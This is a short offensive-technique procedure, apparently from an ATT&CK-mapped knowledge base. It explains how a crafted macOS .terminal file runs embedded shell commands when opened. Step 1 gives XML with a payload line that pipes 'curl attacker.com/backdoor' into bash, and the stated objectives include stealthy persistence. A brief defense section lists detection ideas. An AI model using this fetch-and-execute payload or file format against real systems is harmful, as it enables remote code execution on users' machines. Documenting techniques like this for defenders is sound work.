---
id: proc-uuid-4
tags:
  - rce
  - shell-execution
  - unix-shell
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - macOS
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T17:24:08.113Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Execute-Arbitrary-Shell-Commands-with-User-Privileges

## Summary

This procedure achieves remote code execution by having the macOS Terminal app interpret the .terminal file's XML and run embedded shell commands at the user's privilege level, without further interaction.

## Description

Once opened, the .terminal file's XML structure—specifically the ProgramArguments or CommandAndArgArray—defines a shell invocation (e.g., /bin/sh -c 'payload'). Terminal executes this as a script, allowing arbitrary commands like data exfiltration or malware installation. The attack runs in the victim's user context, potentially escalating if combined with other vulns. Target is macOS; outcomes include full RCE post-bypass.

## Requirements

1. .terminal file with valid XML and shell payload
2. Terminal.app access (standard on macOS)
3. Prior bypass of Gatekeeper/quarantine

## Defense

Defensive measures and detection strategies:

- Restrict Terminal.app execution via parental controls or MDM policies
- Monitor process creation for /bin/sh spawned from Terminal with unusual args
- Audit shell command logs in macOS (e.g., via os_log)

## Objectives

1. Run attacker-controlled shell code on the victim system
2. Maintain user privileges for stealthy persistence
3. Enable follow-on actions like payload download

## Instructions

### Step 1: Embed and Trigger Shell Payload

**Context**: Ensure the XML launches the shell with the desired command.

In the .terminal XML, set:

```xml
<key>ProgramArguments</key>
<array>
    <string>/bin/sh</string>
    <string>-c</string>
    <string>echo 'RCE achieved' > /tmp/pwned.txt; curl -s attacker.com/backdoor | bash</string>
</array>
```

> Upon opening, /bin/sh executes the -c argument string directly.

### Step 2: Validate Execution

**Context**: Confirm RCE post-launch.

Check for side effects, e.g., file creation or network outbound.

> Success if payload runs, e.g., file /tmp/pwned.txt exists.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[rce]]
- [[shell-execution]]
